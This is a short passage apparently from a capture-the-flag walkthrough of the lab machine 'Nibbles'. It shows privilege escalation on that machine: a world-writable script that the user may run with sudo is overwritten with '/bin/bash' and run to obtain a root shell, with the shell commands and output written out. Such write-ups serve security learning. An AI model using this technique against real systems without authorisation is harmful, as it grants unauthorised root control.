Next, unzip the zip file in /home/nibbler, and let's check file permission of monitor.sh.

-rwxrwxrwx 1 nibbler nibbler   10 Oct  1 23:40 monitor.sh

The file is readable, writable, and executable by user nibbler. Therefore, we can simpley re-write contents of the file and get root bash.

nibbler@Nibbles:/home/nibbler/personal/stuff$ echo '/bin/bash' > monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
root@Nibbles:/home/nibbler/personal/stuff# #root bash
